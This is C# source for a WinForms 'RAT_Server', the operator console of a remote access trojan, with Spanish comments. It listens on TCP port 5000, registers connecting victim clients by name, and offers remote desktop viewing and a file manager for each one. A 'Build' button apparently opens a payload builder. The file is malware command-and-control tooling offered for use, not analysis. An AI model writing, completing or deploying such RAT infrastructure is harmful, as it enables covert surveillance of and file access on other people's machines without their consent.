using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace RAT_Server
{
    public partial class ServerForm : Form
    {
        private TcpListener server;
        private Thread acceptThread;
        private volatile bool serverRunning;
        private Dictionary<string, TcpClient> connectedClients = new Dictionary<string, TcpClient>();
        private ContextMenuStrip contextMenu; // Declarar el ContextMenuStrip aquí
        private object clientLock = new object();

        public ServerForm()
        {
            InitializeComponent();
            InitializeContextMenu(); // Inicializar el menú contextual
        }

        private void InitializeContextMenu()
        {
            contextMenu = new ContextMenuStrip(); // Inicializar la instancia del menú contextual

            var menuRemoteDesktop = new ToolStripMenuItem("Ver Escritorio Remoto");
            menuRemoteDesktop.Click += menuRemoteDesktop_Click;

            var menuFileManager = new ToolStripMenuItem("Administrador de Archivos");
            menuFileManager.Click += menuFileManager_Click;

            // Puedes agregar más opciones al menú aquí
            contextMenu.Items.Add(menuRemoteDesktop);
            contextMenu.Items.Add(menuFileManager);
        }

        private void ServerForm_Load(object sender, EventArgs e)
        {
            StartServer(5000); // Iniciar el servidor en el puerto predeterminado
        }

        private void StartServer(int port)
        {
            try
            {
                server = new TcpListener(IPAddress.Any, port);
                server.Start();
                serverRunning = true;
                AppendLog($"Servidor iniciado en el puerto {port}...");
                acceptThread = new Thread(AcceptClients)
                {
                    IsBackground = true
                };
                acceptThread.Start();
            }
            catch (Exception ex)
            {
                AppendLog($"Error al iniciar el servidor en el puerto {port}: {ex.Message}");
            }
        }

        private void StopServer()
        {
            try
            {
                if (server != null)
                {
                    serverRunning = false;
                    server.Stop();
                    server = null;
                    if (acceptThread != null && acceptThread.IsAlive)
                    {
                        acceptThread.Join();
                    }
                    AppendLog("Servidor detenido.");
                }
            }
            catch (Exception ex)
            {
                AppendLog($"Error al detener el servidor: {ex.Message}");
            }
        }

        private void AcceptClients()
        {
            while (serverRunning)
            {
                try
                {
                    var client = server.AcceptTcpClient();
                    Thread clientThread = new Thread(() => HandleClient(client))
                    {
                        IsBackground = true
                    };
                    clientThread.Start();
                }
                catch (ObjectDisposedException)
                {
                    break; // El servidor se detuvo
                }
                catch (SocketException) when (!serverRunning)
                {
                    break;
                }
                catch (Exception ex)
                {
                    AppendLog($"Error al aceptar un cliente: {ex.Message}");
                }
            }
        }

        private void HandleClient(TcpClient client)
        {
            try
            {
                var stream = client.GetStream();
                var reader = new StreamReader(stream);

                string clientName = reader.ReadLine();
                if (string.IsNullOrEmpty(clientName)) return;

                lock (clientLock)
                {
                    if (connectedClients.ContainsKey(clientName))
                    {
                        RemoveClient(clientName);
                    }

                    connectedClients.Add(clientName, client);
                    AppendLog($"Cliente conectado: {clientName}");

                    Invoke((Action)(() =>
                    {
                        listViewClients.Items.Add(clientName);
                    }));
                }

                while (true)
                {
                    if (!client.Connected || !IsClientConnected(client))
                    {
                        break;
                    }

                    Thread.Sleep(1000);
                }

                lock (clientLock)
                {
                    RemoveClient(clientName);
                }
            }
            catch
            {
                AppendLog("Error al manejar un cliente.");
            }
        }

        private void RemoveClient(string clientName)
        {
            if (connectedClients.ContainsKey(clientName))
            {
                connectedClients[clientName].Close();
                connectedClients.Remove(clientName);

                AppendLog($"Cliente desconectado: {clientName}");

                Invoke((Action)(() =>
                {
                    foreach (ListViewItem item in listViewClients.Items)
                    {
                        if (item.Text == clientName)
                        {
                            listViewClients.Items.Remove(item);
                            break;
                        }
                    }
                }));
            }
        }

        private bool IsClientConnected(TcpClient client)
        {
            try
            {
                return !(client.Client.Poll(1, SelectMode.SelectRead) && client.Client.Available == 0);
            }
            catch
            {
                return false;
            }
        }

        private void AppendLog(string message)
        {
            Invoke((Action)(() =>
            {
                textBoxLogs.AppendText($"{DateTime.Now}: {message}{Environment.NewLine}");
            }));
        }

        private void buttonBuild_Click(object sender, EventArgs e)
        {
            var builderForm = new BuilderForm();
            builderForm.Show();
        }

        private void buttonListen_Click(object sender, EventArgs e)
        {
            var listenForm = new ListenForm(this);
            listenForm.Show();
        }

        public void ChangeListeningPort(int port)
        {
            StopServer();
            if (port > 0)
            {
                StartServer(port);
            }
        }

        private void listViewClients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && listViewClients.SelectedItems.Count > 0)
            {
                contextMenu.Show(Cursor.Position);
            }
        }

        private void menuRemoteDesktop_Click(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                string clientName = listViewClients.SelectedItems[0].Text;
                if (connectedClients.ContainsKey(clientName))
                {
                    TcpClient client = connectedClients[clientName];
                    var remoteDesktopForm = new RemoteDesktopForm(client);
                    remoteDesktopForm.Show();
                }
                else
                {
                    MessageBox.Show("El cliente ya no está conectado.");
                }
            }
        }

        private void menuFileManager_Click(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                string clientName = listViewClients.SelectedItems[0].Text;
                if (connectedClients.ContainsKey(clientName))
                {
                    TcpClient client = connectedClients[clientName];
                    var fm = new FileManagerForm(client);
                    fm.Show();
                }
                else
                {
                    MessageBox.Show("El cliente ya no está conectado.");
                }
            }
        }
    }
}
